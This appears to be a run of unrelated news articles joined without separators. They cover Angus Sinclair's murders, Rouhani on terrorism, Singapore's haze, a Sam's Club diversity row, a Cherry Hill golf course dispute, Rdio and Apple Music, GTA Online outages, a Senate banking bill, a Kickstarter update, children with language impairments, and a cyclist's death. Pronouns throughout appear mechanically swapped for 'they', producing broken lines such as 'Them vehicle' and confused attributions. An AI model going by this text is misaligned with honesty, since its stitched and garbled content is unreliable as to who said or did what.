Global weapons manufacturer Lockheed Martin sponsored last year's forum, which was attended by about 700 defence industry and government representatives.

The long-awaited guilty verdicts in the case of the World's End murders mean Angus Sinclair has now been convicted of four killings. But they are suspected of many more.
I have investigated Sinclair's brutal criminal past and I have met the detectives who spent much of their careers pursuing them as well as speaking to some of their victims who lived to tell the tale.
They all paint a chilling picture of a Jekyll and Hyde character, whose cynically violent streak and obsession with sex would wreak havoc across central Scotland during the 1970s and early 80s.
Including World's End victims Helen Scott and Christine Eadie, Sinclair is suspected of murdering six women in seven months. Of those, they have only ever been charged with the World's End pair.

Image copyright PA Image caption Christine Eadie and their friend Helen Scott were killed in October 1977
Former Lothians Detective Superintendant Allan Jones said that a killing spree of this magnitude had not been seen in Scotland in modern times.
They said: "There's no other thing to compare it to, really. There have been serial killers elsewhere, in other countries. But in Scotland, no - there's nothing else.
"Peter Tobin is clearly one of the worst killers we've ever seen in recent times, but Sinclair is by far the worst."
Sinclair's obsession with sex was evident from an early age. For a BBC programme five years ago, I uncovered a psychiatrist's report about Sinclair.
It said: "I do not think that any form of psychotherapy is likely to benefit their condition and they will constitute a danger from now onwards.
"He is obsessed by sex, and given the minimum of opportunity, they will repeat these offences."
This was written when Sinclair was just a boy, after they killed their first victim in 1961, aged just 16. And its chilling warnings would not be heeded.

2001 - convicted of the murder of Mary Gallacher
2007 - trial for murders of Christine Eadie and Helen Scott collapses
2014 - retrial finds Sinclair guilty of World's End murders
The 16-year-old Sinclair had lured their seven-year old neighbour Catherine Reehill and raped and strangled them The calculated manner in which they disposed of the body and tried to cover their tracks shocked police.
They even called the ambulance himself, telling the operator, that "a wee girl has fallen down the stairs".
But detectives could not break them down, so they turned to their older brother John, who persuaded them to confess.
John told me that they wished they had stopped Angus in their tracks there and then.
Speaking to me in 2009, they said: "I would have done time for him. I would have killed him. If I'd known years ago I'd have pushed them in the bloody canal. And all these people, all these girls, would never have had that."
John cut their brother off forever from that day onwards. They said: "I would just have nothing to do with him, nothing do to with him. They can rot in prison."
But Angus Sinclair's life of crime was only just beginning. They served just six years for that killing. They were released, and became integrated into society and was a skilled tradesman. They even married and had a son.

But in 1977 there was a spate of murders across Scotland. Six young women disappeared after nights out, and were found dumped on deserted farmland or waste ground.
Two of those victims were teenagers Helen Scott and Christine Eadie, who had last been seen at the World's End pub on Edinburgh's Royal Mile.
The biggest manhunt in Scottish police history was launched. But it would lead nowhere.
At that time, police did not link the killings to another four murders which had happened in Glasgow within a few months of each other.
Frances Barker, 37, Hilda McAuley, 36, Agnes Cooney, 23 and Anna Kenny, 20, had been killed and dumped in strikingly similar circumstances.
All had been bound and gagged with items of their own clothing.
Image caption Agnes Cooney and Anna Kenny are thought to have been murdered by Sinclair in 1977
Image caption The murders of Frances Barker and Hilda McAuley have also been linked to Sinclair
In a striking twist, the last person to see victim Anna Kenny alive, Wilma Sutherland, became the wife of Gordon Hamilton, Sinclair's accomplice, just months after this spate of murders.
Some detectives believe the circumstances of this too improbable to be a coincidence. But Hamilton became an alcoholic and died a pauper's death in a Glasgow homeless shelter in 1996, before they could be held to account for their actions.
It would be a quarter of a century before police would realise the World's End and Glasgow murders were uniquely similar, and might be linked.
But Sinclair was not quite finished. Around a year after World's End, 17-year-old Mary Gallacher was abducted in Glasgow, and raped and murdered. Like the others, a ligature had been involved and they died from a knife wound to their throat.
But this time, they had been seen. There had been a witness to the abduction, and police had come close to identifying a suspect.
This close shave, criminologists believe, was the signal for Sinclair to change their tactics. They needed easier targets, and so they began to prey on children.
Between 1978 and 1982, Angus Sinclair would rape or indecently assault countless children across Glasgow.
Image caption Catherine Reehill was killed by Sinclair in 1961, when they were just 16
I met two of their victims, both grown women. One told me how they had lured them into a tenement.
They said: "He asked me if I could do them a favour and go and take their mum's change up to them and they told me what close and what door."
"[Then] they just grabbed me and they said listen I've got a knife and if you don't do as you're told, then I'll kill you.
"I thought I'll just do as I'm told and be quiet. So I just shut my eyes and just hoped he'd go away."
It is not known how many children Sinclair attacked during this period. They were finally caught in 1982, and pleaded guilty to 11 charges of rape and indecent assault, although they admitted their victims could have numbered in the hundreds. They were sentenced to life.
It would be almost 20 years later, when they were being prepared for parole, that one of their old crimes came back to haunt him: the 1978 murder of Mary Gallacher.
A cold case review had revealed Sinclair's DNA had been on the victim.
Former DCI Brian Murphy of Strathclyde Police, who led the investigation into the Gallacher case, said Sinclair had shown no remorse.
They told me: "He's one of the most evil people I've certainly interviewed, in my life. There were things going on in their head which clearly I couldn't reach."
Image copyright Crown office Image caption Sinclair raped and murdered Mary Gallacher in 1978 but was not convicted until 2001
But three years later in 2004, some ingenious detective work and cutting edge science was about to put Sinclair in the frame for World's End.
Their DNA, and that of their dead brother-in-law, Gordon Hamilton, was found on a semen stain taken from Helen Scott's coat.
And Operation Trinity, the joint Lothian and Borders/Strathclyde Police investigation, was also looking at the unsolved Glasgow murders, and for the first time was treating all six as connected.
They had reviewed every murder in Scotland since 1968 - more than 1,000 - and found that only six bore the same uniquely similar characteristics. They had all been bound and gagged with items of their own clothing. And they had all happened within seven months.
Scottish police decided to ask for a second opinion, and turned to the world's foremost authority on serial killers, the FBI.
Former special agent Mark Safarik spent months poring over the evidence. I met them near the FBI's HQ in Quantico, Virginia, and they told me they were confident all six murders had been the work of a lone serial killer.
Image caption The first trial of Sinclair for the World's End murders ended in disaster
Image caption Sinclair, now aged 69, committed the World's End murders 37 years ago
They said: "They brought six cases, and really the request for us was, can you look at all six of these cases and render an opinion about whether you think these cases are linked or not? And we requested all the case information, photographs, autopsy reports, anything that they had back from 1977.
"And after our analysis it was really clear to me, I felt very strongly, that all these crimes had been committed by the same offender."
Scottish police planned to charge Sinclair with all six murders.
But there were two problems:
Strathclyde police had lost all the evidence from the unsolved Glasgow murders.
But even more embarrassing than that, was that someone was already in prison for the murder of Frances Barker - the first in the sequence from 1977 - and had been for almost 30 years.
The Crown decided to drop the Glasgow cases, and go all out on World's End. Sinclair went on trial in 2007 and that attempt ended in disaster.
Sinclair is now convicted of murdering Helen Scott and Christine Eadie, but former detective Allan Jones, for whom catching the World's End killer became a life's work, believes Sinclair should have been prosecuted for all six murders - including the Frances Barker case.
They said: "Knowing the evidence that exists, and having the ability to have my own opinion, I still believe there's very strong evidence to support the case against Angus Sinclair."
Image caption Catching Sinclair has been a life's work for Detective Allan Jones
Thomas Ross Young, the man who was imprisoned for the murder of Frances Barker, continued to plead their innocence until their death in July this year.
No-one has ever been charged with the murders of Agnes Cooney, Hilda McAuley and Anna Kenny.
Tom Wood, former deputy chief constable of Lothian police and the man who spearheaded the Operation Trinity, believes Sinclair still has much to answer for.
They said: "Throughout their life…he has been nothing but disaster to almost everyone they have met.
"He is a violent criminal; they committed extremely violent robberies, a string of very serious sexual offences against young girls, as well as the murders we now know they committed.
"And I believe there are probably many, many more crimes they have committed, and we will probably never know."

“Today, we are glad that Iran is a great defensive wall in the region against Daesh and al-Qaeda and is fighting off terrorism,” President Rouhani said at a press conference on Thursday, at the conclusion of their trip to New York for the UN General Assembly meeting.
They also warned that the “virus of terrorism” has spread throughout the world, as in Europe, Asia and Africa, stressing that the threat is not confined to the Middle East or Iran.
The president also underscored that Iran is engaged in the battle against terrorism for the sake of its own security and at the request of the regional governments.
During their two-day stay in New York, President Rouhani held several meetings with foreign leaders and attended high-profile meetings.
In their address to the 71st UNGA meeting, the president attributed the genesis of borderless violent extremism and terrorism to “the security strategies developed by major powers in the past 15 years.”
Singaporeans reduced military training exercises, kept cough-stricken children indoors and wore protective masks to work after a smoky haze triggered by forest fires in neighbouring Indonesia caused air pollution to hit its worst level in nearly 16 years.
Singapore's main measurement of air quality has hovered at the unhealthy classification as smoke from blazes on Sumatra island drifted across the sea and cast a grey pall over the city-state's skyscrapers.
The readings on the pollutant standards index were mostly between 104 and 123 on Tuesday, within the unhealthy range of between 101 and 200. A peak reading of 155 on Monday night was the highest since late 1997, when officials reported a 226 reading.
Smoke haze is an annual problem for Singapore and its northern neighbour, Malaysia, often beginning midyear, when farmers in Indonesia seek to clear land cheaply by starting fires. It sometimes causes diplomatic strains as Malaysia and Singapore urge Indonesia to do more to prevent illegal burning.
Malaysia has been only lightly affected so far this year, with pollution readings in Kuala Lumpur, its largest city, not breaching the unhealthy mark. Indonesia has said part of the current problem is caused by peat blazes that firefighters are struggling to extinguish during hot, dry weather.
The forest ministry spokesperson, Sumarto Suharno, said the government was continuing to educate farmers about alternatives to traditional slash-and-burn agriculture. "We have been able to reduce the regional haze problem significantly for years with help from local communities and will continue to undertake all efforts to prevent it from spreading," they said.

In Singapore, the defence ministry spokesperson, Kenneth Liow, said the armed forces had reduced physical and outdoor training accordingly after the pollution index exceeded 100.
Landscaper Hedrick Kwan blamed the haze after their two young sons started coughing as an acrid smell filled the air. "We usually leave the windows open but now we can't do that because of all the dust and smoke," they said.
The National Environment Agency has advised Singaporeans, especially the elderly, children and people with respiratory problems, to avoid prolonged exposure outdoors.
Melissa Cheah, a financial sector worker, said their office considered advising employees to wear protective masks.
Singapore's environment minister, Vivian Balakrishnan, said their agency had offered to help Indonesia extinguish the forest fires.
Hospitals and clinics are expecting further smoke-related admissions next week.
"Based on what we have seen over the years, when the haze hits us, it takes about three to four days before we see all these additional patients coming in for medication," said Sarani Ng Omar, a GP, who predicted a rise in asthma-related cases, nasal problems and eye inflammation.
Sam's Club CEO Rosalind Brewer. AP Photo Sam's Club CEO Rosalind Brewer is being accused of discriminating against white men following a CNN interview where they discussed the importance of workforce diversity.
Brewer was asked by the interviewer how they promote diversity within their company.
"It has to start with top leadership," Brewer said. "My executive team is very diverse and I make that a priority. I demand it within my team."
They said they mentor women inside and outside of their company, as well, and also encourages Sam's Club's partners to hire a more diverse workforce.
Now here's the comment that ignited the uproar. Brewer said:
Just today we met with a supplier and the entire other side of the table was all Caucasian males. That was interesting. I decided not to talk about it directly with [the supplier's] folks in the room because there were actually no females, like, levels down. So I'm going to place a call to him.
Critics are claiming that Brewer's remarks are evidence that they advocate against employing and hiring white men — even though four of the eight people on their executive team are white men. Some customers are now accusing Brewer of being "racist" toward white men and are threatening to boycott Sam's Club.
The interview has since been shared widely by right-wing sites, including RedState, BizPac Review, and TeaParty.org, prompting some customers to criticize the company online.
"As a white male I'm deeply offended by the remarks of your employee," one person wrote on Sam's Club's Facebook page. "We will not be patronizing Sam's Club until this is corrected."
"Racism is alive and well in America," another user wrote. "I will never spend a dime in a Sam's club!"
A third wrote: "This is so wrong they need to be fired ASAP."
Walmart is standing behind Brewer's remarks.
"For years, we've asked our suppliers to prioritize the talent and diversity of their sales teams calling on our company," Walmart CEO Doug McMillon said. "Roz was simply trying to reiterate that we believe diverse and inclusive teams make for a stronger business. That's all there is to it and I support that important ideal."
Some critics reacted to Brewer's remarks on Twitter:
Others showed support for Brewer:

The latest salvo in the battle over the future of the Woodcrest Country Club comes from the South Jersey developer who is suing Cherry Hill Township in order to build more than 800 homes on the property. NBC10's Rosemary Connors has more in the "war over Woodcrest." (Published Monday, Oct. 14, 2013)
A 150 acre golf course is at the center of a dispute between Cherry Hill officials and a local developer.
Last Spring, the First Montgomery Group bought the Woodcrest Country Club for $10.1 million at a bankruptcy auction. The conflict began however, when First Montgomery announced its plans to build over 800 homes on the golf course.
“They went public and said from the beginning that they were interested in this as a golf course,” said Cherry Hill Mayor Chuck Cahn. “And they told our residents that. They went back on their word and now they're talking about the development of 840 homes.”
First Montgomery officials are now suing Cherry Hill Township and insist they have a fundamental right to build the homes, which they claim are needed in order to fulfill Cherry Hill's Affordable Housing obligation by law.
A spokesperson for First Montgomery told the Courier Post that the Woodcrest Country Club property has been “included in Cherry Hill's affordable-housing plan since Cherry Hill executed a 1993 consent order (to settle an affordable-housing lawsuit).”
Mayor Cahn sent a letter on Friday to Cherry Hill residents claiming the developer “has spewed nothing but lies and deceit.” They also said the township “will not be threatened by school yard bully tactics.”
Those who oppose the development plan fear it would bring too much congestion to the area. The golf course is located at the already busy intersection of Evesham and Haddonfield Berlin roads.

A spokesperson with First Montgomery told NBC10 that the town's opposition is “an abuse of power and exhaustion of taxpayer resources.” The email also highlighted First Montgomery's Community Outreach, which includes charitable outings at the golf course, access for a high school team and discounts to the police, fire and military.
“We are the good guys,” the spokesperson insisted.
First Montgomery officials need zoning approval from the township planning board in order to build the homes. In their lawsuit, First Montgomery officials are asking the state court to intervene and allow zoning for development. Meanwhile, Cherry Hill officials told the Courier Post they would “exhaust every avenue” at their disposal to stop the development on the golf course.
With Apple's launch of Music this week, all its rivals have naturally gone on the defensive.
Spotify's CEO Daniel Ek quickly tweeted, then deleted “Oh OK” as Apple Music was announced. Deezer's CEO Hans-Holger Albrecht reportedly said “the jury's out on Apple Music.” and Rdio put out a statement designed to mimic Apple's statement to IBM back in 1981.
“Welcome, Apple. Seriously. Welcome to the most exciting and important frontier since the digital music revolution began 16 years ago.”
For a company so welcoming of the new entrant, it does seem like a strangely coincidental moment for Rdio's CEO Anthony Bay to be in town talking about the future of streaming audio.
It's an area of keen interest, with the launch of new services from big names like Apple and the highly-publicized relaunch of Tidal this year, is the industry headed for a period of acquisition and consolidation? Are there enough differences between the services to allow so many to thrive, or at least survive?
‘A fragmented mess'
On stage during the WWDC keynote where Music was introduced, record and film producer and now Apple employee Jimmy Iovine described the music ecosystem as “a fragmented mess.”
By that they meant that there is no single place to stream music, videos, follow artists to get gig information, etc.
Apple Music is hoping to provide all of that.
The thing that Iovine wants and which you could argue is Apple Music's selling point, Rdio's Bay sees as a potential problem: It's going to be a part of iTunes rather than a standalone app.
That gives it huge potential reach, but adds yet another service into already bulging software. Complaints about iTunes are nothing new. Bay says:
“So you have Apple Music next to podcasts and e-books and ‘rent a movie' and ‘buy a TV show', plus your own music, there's a risk of it being very confusing. It's going to be really hard and that's the problem they have today. It [iTunes] started out really clean and simple 12 years ago, and has just kind of gotten messy. That's the challenge in trying to do a lot.”
Of course, Bay is pointing this out because Rdio has only one mission.
“We're laser-focused, we're not in the video business. We're laser-focused on a great music experience. We're trying to be a specialty retailer when they're a department store.”
You have to wonder how many specialty retailers, versus department stores or supermarkets, you see on the high street nowadays though. Some survive, but not as many as used to.
Crowded house
Spotify is another Rdio competitor usually trumpeted in discussions around the company, but there are plenty more too – Google Play Music, YouTube Music Key, Deezer, XBox Music, to name just a few.
It's a crowded marketplace, and one that shares virtually all the same music. Each player has different priorities though – Apple at its core is a hardware company, Google wants to drive ad views, and services like Rdio, Pandora, Spotify and numerous others are trying to carve our their own spaces within specifically music-focused businesses.
Nonetheless, while the outlook may be different for each of them, they are essentially providing the same music, albeit with a slightly different user experience. Apple is pushing hard to attract unsigned artists with the lure of a huge distribution platform because it knows that the rest of its offering isn't unique.
This is why Bay says he's not worried about Apple stealing all Rdio's customers, despite its impressive scale and track record of redefining markets.
“When you look at where Apple has done remarkable things, it's when they do something new: the original Mac, the iPod, the iPhone, the iPad – those are all ‘wow'.
This is not that. This is another version of music.”
Despite Bay's insistence that Apple is playing catchup in music, it has undeniable clout. But does its launch even matter? Are people really loyal to one service?
“It's not a zero sum game in terms of what people will get for free. I do think it's a zero sum game in the sense [of paid services]. I don't think people will pay to subscribe to multiple music services,” Bay reasons. “It's not like Netflix and LoveFilm [Amazon Prime Instant Video] because the catalogs are pretty much the same. The music business has never been based on exclusivity but the movie and television businesses always have.”
It's an interesting point – the other elements of the ‘entertainment' world like movies and TV have diverse revenue opportunities. Music has less of that, Bay argues.
The music world evolved around buying; [in] the movie business you could rent a movie, you could subscribe to a movie channel , you could go to a movie theatre, you could buy a DVD.. The movie business had all these different models, the music business never did, you owned it. You never paid to listen. The only time you paid to listen was if you went to a live show, and then you pay to listen.”
However, just because the music world hasn't previously been based on exclusivity, that doesn't guarantee it never will be – it's certainly the way Tidal is trying to angle its service, and Apple Music was heavily rumored to be trying to secure Kanye West's upcoming album as an exclusive deal.
Expanding horizons
It's also not a zero sum game because – as shown in Mary Meeker's Internet Trends report recently – there are now more people online than ever, and more being added in developing nations every day.
More people coming online means a larger potential customer base. That's the theory anyway. Whether or not a paid-for subscription service is the correct model to take advantage of new markets remains to be seen.
Bay hopes that the company's focus on user experience and ubiquity will help Rdio stay healthy, but also has longer term vision for new integrations.
We don't think it will be winner take all, because we all have the same music; you don't see a single car company, there are no other categories – particularly in media – when you find a single company. In a category that's not based on complete uniqueness, uniqueness is in the experience and so we've been very focused on design and targeting particular audiences just for music and not trying to smush it together. “
It's also hoping to take advantage of the booming trend for messaging potentially. In Japan, the messaging app Line has already launched its own streaming service, so it's clearly an idea with potential.
One thing holding that back is licensing – for all the big players.
To deliver streaming Rdio and on-demand songs to 85 countries takes more than 600 different licensing agreements. Each track then needs three separate licenses. You also need licenses for specific device types, or in cars, for example.
For comparison, Apple is promising more than 100 markets, so its licensing agreements are likely even more complex. Spotify is in around 50 countries.
The problem behind the complexity of the licensing is, essentially, working out a fair price and the best way to remunerate artists as the industry continues to evolve. Bay says:
“Licensing is getting more complex. It's getting worse. The challenge is how do you find things that make sense [and] that are sustainable over a long period of time. Everyone's trying to sort out what's a fair price, a fair split. How do you compensate people who are used to being paid all up front when they're [now] being paid over time. There's a lot of people trying to sort it out.”
Working out exactly how much to give away for free (which, in the homo-economicus view has potential to be detrimental to the whole market) and what to charge has always been the challenge in sustaining the balance between artists, users, labels and the music business' bottom line.
With plenty of high-profile hissy fits from artists over royalty rates on streaming services, it's a problem that will need solving for the long-term but not one that's wholly insurmountable.

After Matt's recent opinion piece about the entitled attitude of some gamers, I decided to dig a little deeper into the GTA Online debacle… The following paragraph is an actual comment taken from the Rockstar Support Forum; this is actually one of the more eloquently put examples of the Rockstar failed side of the argument:
“We paid our hard earned money to play this & basically only got half of what we were supposed to. We have every right to be pissed, epscially [SIC] when we see our friends online playing & sending us invites to a game we can't even play. They had months of time with all the preorders put in, plus an additional 2 weeks to get it straightened out. They knew in advance how many people to expect to be online. In my view, there's no excuse good enough for Rockstar not having this sht [SIC] sorted out & ready to go. Maybe next time they should beta test it before launch of the game as a safety precaution.”
Having worked for multinational corporations and knowing a bit about the red tape and rigmorale that can surround large infrastructure investments, I decided to contact an expert in the field and get their independent opinion on a few elements of this debate.
Chris Gill is a Senior Software Engineer who works for a UK based web developer, which runs their own server farm; they are not connected to Rockstar or GTA Online, but they have a far greater understanding of the intricacies of these things than I do… We asked their technical opinon on whether Rockstar should have been able to ensure all users could access GTA Online, having had two weeks to ‘get it straightened out' and would a beta test have helped avoid this?
“Rockstar Games will operate their own server network, basically the GTA ‘cloud'. If that doesn't have enough capacity they will either need to upgrade the hardware (more memory/CPU etc.) or more likely just buy more servers to increase it. This hardware will need to be ordered, delivered, plugged in, installed and networked. The additional servers may need additional rack space (the cabinets they keep them in), which again will need to be bought in and set-up. Plus there may be extra requirements for power and/or cooling (more servers means more heat, means more air conditioning required to keep it all cool). Certainly the latter of these would not necessarily be quick and easy to install in any data centre.
It's also not simply a case of plugging a new server into a rack and off you go. There are all the software considerations of how does that new server extend the network, what roles do it play, what data can it access (shared in another part of the network usually), what other servers can it talk to, how has it affected the overall security surface of the network and most importantly how do you spread the game engine across it in such a way as to increase performance without introducing bugs? Once you have nailed all that you must test the whole network topology again. All of this stuff takes time to set-up, even if you have millions of dollars to throw at it.
Network bandwidth will also be a consideration. The problem with a single release date is that all users want to log on at exactly the same time (as opposed to a phased release, such as geographically by continent for example) which means all the bandwidth you can muster might still not be enough for a single data centre. World of Warcraft had lots of problems every time a new expansion was released, as people queued up to gain access to the new world/realm. Often people had to wait hours to log on to their server, as seems to be happening with GTA V.
Geographic diversity is obviously an option here. Have servers in Europe serve customer in Europe, the same in North America etc. This is all fine and sensible but it also increases the complexity of communication and synchronisation of these distinct server setups. You also have to add in the communication between these networks which takes bandwidth and processing (although usually this is on dedicated lines, away from the public ones). Additionally, any rollout of updates to game code is now over multiple networks.
Available bandwidth will also be limited by your overall carrier network and surrounding infrastructure. Simply buying more bandwidth is not always easy. If you need 350 Gb burst capacity to handle all your concurrent logins and the cables in the road only allow for 50 Gb you are limited until your providers can physically lay new cables.
Sales figures (and previous game popularity) should help you get most of this right though, roughly speaking. If you know you've sold 15 m copies on pre-order, you get your servers in order quick smart. However there are other things at play here that probably are the major cause of the recent outages.
More often than not the big group of servers in the GTA ‘cloud' will all have distinct roles, or handle distinct areas of the world (both the in-game world and our own planet). It only takes one of these roles to get too busy (an authentication server, a map server, or a server to deliver the user data for example) and you get a bottleneck in the system that affects everything, despite load on other areas being light. This kind of bottleneck cannot always be anticipated prior to ‘real' people hitting the network en-mass, despite all the stress tests, bots, scripts and beta testing that would be undertaken.
It's also true that scripts and even beta testers can't really simulate millions of ‘real' people hitting the site with their own emotions and frustrations. If they can't load the game straight away they might logout and login again or restart the game, which in turn could simply compound the effects they were already seeing by adding further load to the servers.”
Industry analysts were putting the number of pre-orders between 2.5 and 7 million across both consoles in Sept and suggested that GTA V would make $1 billion in the first month… it did that within the first three days (~17 million copies sold in 3 three days instead of the anticpated 30 days based on my back of the envelope calculations); is it so surprising that Rockstar weren't able to please everyone on the day of the GTA online launch, with the huge demand and the reality of what's involved in upgrading a server farm?
The truth is we'll probably never be able to truly answer that question; we don't have an exact figure for pre-orders that Rockstar were working with and we don't know their internal sales projections and their anticipation of how many people who bought the game would attempt to access the online portion upon launch. The important thing now is how quickly the service stabilises and the ongoing support from Rockstar. This evening a title update has been released for PS3 to hopefully resolve ‘commonly reported issues' and the Xbox 360 update is coming shortly.

Wall Street banks are raking in record profits, but that's not stopping Senate Republicans—with the help of nine of their Democratic colleagues—from attempting to ram through an "insane" piece of legislation that would scrap a number of key post-financial crisis regulations, "line the pockets of bank executives," and leave consumers more vulnerable to predatory corporations.
"A bunch of senators—including some Democrats—are trying to roll back the rules for big banks that sucked down nearly $50 billion in taxpayer-funded bailouts a few years ago." —Sen. Elizabeth Warren (D-Mass.)In a hearing on Tuesday, the Senate Banking Commitee debated Sen. Mike Crapo's (R-Idaho) "Orwellian-named" Economic Growth, Regulatory Relief, and Consumer Protection Act, legislation that has been forcefully denounced by progressive lawmakers, labor unions, and consumer protection advocates as a major gift to massive financial institutions that could increase the risk of another financial meltdown.
"A bunch of senators—including some Democrats—are trying to roll back the rules for big banks that sucked down nearly $50 billion in taxpayer-funded bailouts a few years ago," Sen. Elizabeth Warren (D-Mass.) wrote on Facebook ahead of the hearing.
In addition to Sen. Angus King (I-Maine), who typically votes with the caucus, the nine Democratic co-sponsors of Crapo's bill are: Joe Donnelly (Ind.), Heidi Heitkamp (N.D.), John Tester (Mont.), Mark Warner (Va.), Claire McCaskill (Mo.), Joe Manchin (W.Va.), Tim Kaine (Va.), Gary Peters (Mich.), and Michael Bennet (Colo.).
As Tuesday's committee meeting progressed, Warren put forward amendments aimed at making the bill more consumer-friendly, including provisions to protect seniors from financial exploitation and empower students to fight back against loan companies engaging in criminal behavior.
One-by-one, the amendments fell to defeat—and each time, Democrats helped kill them.
Amendment #47 to require bank execs to certify their banks aren't breaking the law failed, 7-16. Four Democrats voted with the Republicans against it. #BankLobbyistsAct — Elizabeth Warren (@SenWarren) December 5, 2017

As David Dayen noted in a piece for The Intercept, these amendments give progressives a golden opportunity to "name and shame Democrats who support this giveaway to big banks," particularly after they spent "the last week railing against Republicans for waging class warfare on low-income Americans."
In their opening statement at Tuesday's hearing, Sen. Sherrod Brown (D-Ohio)—an opponent of Crapo's bill—connected the effort of Republicans and pro-Wall Street Democrats to deregulate the financial sector to the GOP push to deliver tax cuts to the wealthiest Americans and argued that they are both part of a broad effort to transfer wealth upward.
"Last week, the Senate passed a tax bill that helps pass-throughs, corporations and the wealthiest Americans. I guess the idea behind it is that adding to their wealth will trickle down to working people in America," Brown said. "This week, we seem to be applying the same theory to the banking industry."
"This bill, like the tax bill last week and the healthcare bill before it, sends the message that this Congress is not very interested in helping hardworking middle class Americans," Brown added. "It's Christmas for the C-suite, and crumbs for the Cratchits."
Arguing that the bill places the needs of the banking industry over those of homeowners and consumers, Brown proceeded to rattle off some of the legislation's most egregious components:
"It weakens stress tests for both regional banks and larger banks";
"Remove[s] consumer protections put in place after the housing crisis";
"Reduces capital requirements and other important rules for banks above $50 billion"; and
"Does virtually nothing to help hardworking Americans who haven't seen the benefits of the economic recovery."
So, #DoddFrankRollback is YES to banks raking in record profits, NO to Americans struggling with student loan debt, NO to support for servicemembers, NO to protecting seniors, NO to Homeowners, NO to victims of Wells Fargo & Equifax. — Sherrod Brown (@SenSherrodBrown) December 5, 2017
Public Citizen—has joined progressive lawmakers in denouncing Crapo's bill, which the group called "dangerous" in a letter (pdf) delivered to the Senate Banking Commitee last week.
"At a time when the likes of Wells Fargo and Equifax demonstrate that Wall Street needs stronger reforms, Senate banking leaders are proposing to grind holes in key existing safeguards," Bartlett Naylor, financial policy advocate for Public Citizen, said in a statement. "Bill sponsors claim this will promote economic growth, but ignore both current record profits at banks and the millions of Americans who lost their homes, jobs, and savings when inadequate rules and supervision led to the 2008 crash."
Below are all of the co-sponsors of Crapo's legislation:
Sweetbox and ScorPi are now a big success, and it's because of all of you, we are grateful, thanks!
Less than a week to go. We are now working on every stage of production to be within the time. On Sunday the founding will end and the industrial production of the Sweetbox (and its friends) will officially begin.
We intend to spend each cent to make the final product perfect, because we believe that's the purpose of a kickstarter campaign. We are exploring possibilities in the quality of the plastic, performance of the heatsinks (more to come), upgrades of the molding tools, better manufacturing of the metallic pieces, etc.
That is why, even with the project founded, we need to continue to spread the word and make the project explode !
Have a nice week,
all the best,

Image caption Young people with language impairments can find it difficult to express themselves
Imagine listening to a foreign language you are not familiar with all day. It would be tiring and confusing. You would miss important information and you'd have to work very hard to understand what people were saying.
That's what it's like to have a specific language impairment in your own language, says Gina Conti-Ramsden, professor of child language and learning from the University of Manchester.
"These children aren't mute. They can talk - but it's a hidden disability," they say.
"They can't understand what is said all the time and they find it difficult to put words together, and to express themselves."
Aim of a 'normal life'
Most children with SLIs have quite severe language problems and can spend at least 50% of their education in specialist language units, staffed by specialist teachers and speech therapists, rather than mainstream schools.
The aim is to enable them to go back into mainstream primary or secondary school, and that they can achieve a level of language which allows them to function in society, get a job and lead a normal life as an adult.
There was a lot of mickey-taking from the other kids. And I got frustrated and upset because I couldn't do things. Ross Watson
Prof Conti-Ramsden's current research project is concerned with finding out what happens to such children as adults.
Ross Watson, 25, forms part of their study - the largest of its kind in the UK.
They spent most of their primary education in a speech and language unit, returning to mainstream education in Year 6. They remember it as a tough time in their life.
"They didn't help much to begin with. There was a lot of mickey-taking from the other kids. And I got frustrated and upset because I couldn't do things.
"I didn't understand why they made me do music lessons when it would have been better to do extra English instead."
In the end, Ross got nine GCSEs, impressing themselves and their teachers with a C in French and a D in English.
Finding a voice
But they are honest about how their language impairment has affected him.
They have always found it hard to put sentences together, they find themselves getting edgy in new situations and uncomfortable when they have to communicate with people, particularly face to face.
"Talking on the phone is easier in some ways because I can't see facial expressions, which makes it worse to communicate because I'm always wondering what they're thinking."
Image caption Ross went to Orlando in 2009 to visit the inside of a space shuttle
They say they can't work out when people are being sarcastic, which has led to lots of awkward situations in the past - and they suffer from short-term memory loss.
"I'm still forgetful. I forget to call people back a lot. I have to write it down to remember. And I still find reading hard. I have to use a highlighter pen.
"And in a group situation I don't say things first. I don't like to say anything too early in case I've misunderstood something."
However, Ross has come a long way since they were a "very quiet boy in the classroom" who had trouble finding their voice.
They went on to do a course in mechanical engineering at college and now works as a quality inspector of machine parts. In between they spent six years on an apprenticeship at a major defence company.
But not everyone is as lucky as him.
'Quietly confident'
Afasic, the charity which supports children and parents with speech, language and communication needs, says 6% of children starting school have some degree of speech or language difficulty. Around one in 500 are thought to have a serious long-term problem.
Picking it up early is important, says Alison Huneke, helpline manager at Afasic.
"There's more time to address it if it's picked up at this stage and then the child has less experience of failing and losing ground.
There's more time to address it if it's picked up early and then the child has less experience of failing and losing ground. Alison Huneke, Afasic
"But some schools are good at recognising these problems and some aren't."
In fairness, they say it isn't always easy to recognise a specific language impairment. While in some children it will be obvious, others may need a speech and language assessment first - and it is possible it could be misdiagnosed.
As we grow up language is fundamental to virtually everything we do, says Prof Conti-Ramsden, and problems with it can be linked to issues which develop later in life, like anxiety and depression.
The worst-case scenario is that children with specific language impairments become young offenders, since around half of this group of people are thought to have language problems.
Although young people with SLIs look normal, they can suffer from loneliness, struggle to form close friendships and grow up dependent on their parents. Employment is also hard to secure.
But as an adult it is also possible to focus on the things you enjoy and are good at, much more so than at school.
There are lots of things that Ross still doesn't find easy, such as writing reports, talking on the phone, detecting sarcasm and speaking to their boss, but they believe they acquired an inner strength from their early years of intensive speech and language therapy.
This, they say, makes them quietly confident that they have the skills to compete with the brightest and best in society.
Family, friends mourn Paul Umino, longtime Petaluma doctor killed in cycling crash
Paul Umino, a retired Petaluma physician, was an avid cyclist who even in their mid-70s would regularly pedal more than 200 miles a week on the rural roads stretching west from their hometown to the Pacific Ocean, according to family and friends.
They tended to avoid the busiest streets, their loved ones said, steering clear of Bodega Avenue and Valley Ford Road.
On Wednesday morning, as they sought to turn left off Valley Ford Road onto Gericke Road, they were struck and killed by an SUV that was traveling in the same direction in their lane and was behind them when they turned, according to the CHP.
Their longtime girlfriend and frequent cycling partner, Karen Newman, was ahead of them at the time and was not injured.
Susan Davis, the driver of the Toyota SUV, a RAV4, slammed on their brakes trying to avoid Umino but was unable to stop in time, said Officer Jon Sloat, a CHP spokesperson.
Davis, 68, of Novato, had been heading east on Valley Ford about 10:20 a.m., traveling at an estimated 50 mph — 5 mph below the speed limit — when the collision occurred, Sloat said. Them vehicle left 30 to 40 feet of skid marks on the road, they said.
An investigation is ongoing but Davis does not appear to be at fault according to initial findings, Sloat said. They have not been cited.
For family and friends of Umino, 74, an affable family doctor who practiced in Petaluma for more than 40 years before they retired in 2014, the fatal crash has left a cruel void and many unanswered questions.
